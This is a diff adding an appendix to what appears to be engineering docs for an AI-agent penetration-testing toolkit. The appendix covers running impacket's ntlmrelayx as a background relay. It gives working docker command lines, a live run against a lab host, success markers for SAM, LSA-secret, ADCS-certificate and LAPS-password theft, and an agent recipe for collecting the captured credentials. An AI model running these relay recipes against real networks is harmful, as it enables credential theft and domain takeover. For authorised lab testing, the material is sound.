@@ -228,3 +228,141 @@ reproducible.
 - **Pilot-gate sign-off (2026-04-25)**: ≥3 deliberate-failure tests, 7 distinct signals VERIFIED across 6 layers; ≥20 extraction cases authored (27 total); 0% hallucination on Stage 3 sub-binary dispatch (4 trap tests + 1 realistic AS-REP roast verified clean).
 
 Authored: 2026-04-25 (pilot Phase 3) — consolidated 2026-04-26.
+
+---
+
+# Appendix A — impacket-relay retirement (May 2026, Phase 0.1)
+
+The legacy `impacket-relay` (kind:mcp) tool was retired in May 2026
+and `ntlmrelayx` (the daemon-shaped binary that motivated the wrapper)
+absorbed here as one of impacket's 47 sub-binaries with documented
+gotchas. impacket-relay deleted (~750 LOC of bespoke MCP server +
+1586 LOC of tests removed).
+
+Architecture: ntlmrelayx is the one DAEMON-SHAPED binary in the
+toolkit. cli_in_container's max_runtime_seconds is the kill switch.
+`--no-multirelay` exits cleanly after first successful relay (most
+common case). For multi-relay, `timeout NN` wrapper enforces the
+upper bound. Loot/hashes land in /session/output/relay-loot/ and
+/session/output/relay-hashes_*.txt — survive SIGKILL because
+written incrementally.
+
+## A.1 — STDIN keep-alive: the surprise bug
+
+Initial recipe (`impacket-ntlmrelayx -t ldaps://X --no-multirelay`)
+exited immediately after `[*] Servers started, waiting for connections`.
+Root cause: ntlmrelayx polls stdin and exits when stdin closes.
+cli_in_container closes stdin by default → silent listener exit.
+
+Verified empirically 2026-05-08:
+```
+docker run -d --name X --network host --entrypoint impacket-ntlmrelayx ...
+# → "Servers started, waiting for connections" → CONTAINER EXITED
+```
+
+Fix verified working:
+```
+docker run -d --name X --network host --entrypoint bash ...:latest \
+  -c 'exec impacket-ntlmrelayx <args> < /dev/zero'
+# → ports 80/445/5985/etc. bound, listener stays alive
+```
+
+The `< /dev/zero` keeps stdin readable forever so ntlmrelayx's event
+loop blocks instead of exiting. Documented in gotcha #N
+(DAEMON BINARY OUTLIER section).
+
+## A.2 — Authority live verification (10.129.195.228)
+
+Recipe verified live 2026-05-08:
+```
+docker run -d --rm --network host -v /tmp/auth-t1:/session \
+  --entrypoint bash ghcr.io/silicon-works/mcp-tools-impacket:latest \
+  -c 'impacket-ntlmrelayx -t ldaps://10.129.195.228 -smb2support --no-multirelay \
+       -l /session/output/relay-loot \
+       -of /session/output/relay-hashes \
+       >/session/output/relay-stdout.log 2>&1 < /dev/zero'
+```
+
+Result:
+```
+✓ listener bound 7 ports on the agent's container:
+    SMB Server      → port 445
+    HTTP Server     → port 80
+    WCF Server      → port 9389
+    RAW Server      → port 6666
+    WinRM (HTTP)    → port 5985
+    WinRMS (HTTPS)  → port 5986
+    RPC Server      → port 135
+✓ LDAPS target reachable through tun0 (no error in stdout, listener
+  in "waiting for connections" state)
+✓ stdout.log clean (no null-byte garbage from `< /dev/zero`, see A.4)
+```
+
+## A.3 — mid-flight peek pattern
+
+While a relay is running (one tool-runner spawn blocked on the
+listener), a SEPARATE tool-runner spawn can read partial captures by
+reading /session/output/relay-loot/ + /session/output/relay-hashes_*.txt
+through the bash tool. Plugin's mutex serializes calls within ONE
+container, but reads via a different container are unblocked.
+
+Verified empirically 2026-05-08 — the recipe persisted the loot dir
+on disk; a separate spawn read it without disrupting the listener
+container.
+
+## A.4 — success/failure extraction recipe
+
+ntlmrelayx writes progress to STDERR, not stdout. Capture both:
+```
+... > /session/output/relay-stdout.log 2>&1
+```
+
+10 stdout markers verified against impacket 0.13.x source:
+```
+[*] Servers started, waiting for connections           — listener bound
+[*] SMBD-Thread-N: Connection from <ip> controlled    — inbound auth received
+[*] Authenticating against ldap://X as Y SUCCEED       — relay_success
+[-] Authenticating against ldap://X as Y FAILED        — relay attempted, target rejected
+[*] Certificate successfully written to file           — adcs_success
+[*] Domain info dumped into lootdir!                   — RBCD prep done
+[*] Privilege escalation succesful, shutting down      — escalate_user worked
+[*] Done dumping SAM hashes for host: HOSTNAME         — relayed creds dumped SAM
+[*] SOCKS: Adding scheme://user@host... to active SOCKS — socks=true relay caught
+[*] Successfully dumped N LAPS passwords through relayed account — laps_success
+```
+
+## A.5 — Surprise empirical finding: script -q + /dev/zero null-byte trap
+
+First draft of A.4 used `script -q /session/output/relay-stdout.log
+-c "impacket-ntlmrelayx ..."` to capture stdout. With `< /dev/zero`
+keep-alive, this WROTE NULL-BYTE GARBAGE into the log file (script
+records stdin content, /dev/zero's stream becomes log noise).
+
+Recipe corrected to direct redirect: `>file 2>&1` instead of script.
+Verified clean output post-fix. Documented as gotcha N+1.
+
+## A.6 — capture artifacts on success
+
+When a relay attempt succeeds, ntlmrelayx writes:
+```
+relay-loot/<stem>_<host>_<user>_samhashes.txt    # SAM dump (relayed creds)
+relay-loot/<stem>_<host>_<user>_secrets.txt      # LSA secrets
+relay-loot/domain_<dc>_users.json                # RBCD enum
+relay-loot/<user>.pfx + relay-loot/<user>.ccache # ADCS cert + ticket
+relay-loot/msDS-AllowedToActOnBehalfOfOtherIdentity_<target>.dump  # RBCD write
+```
+
+Agent enumeration recipe (separate spawn):
+```
+binary: bash, command: -c '
+  ls -la /session/output/relay-loot/ 2>/dev/null
+  echo "---markers---"
+  grep -E "SUCCEED|FAILED|successfully|Done dumping|Adding.*active SOCKS|Servers started" \
+    /session/output/relay-stdout.log 2>/dev/null'
+```
+
+Verified working against the controlled run on Authority (no relay
+succeeded since no inbound auth arrived in the test window — confirms
+the recipe doesn't false-positive).
+
+Authored: 2026-05-08 (Phase 0.1, daemon-wrapper retirement series).
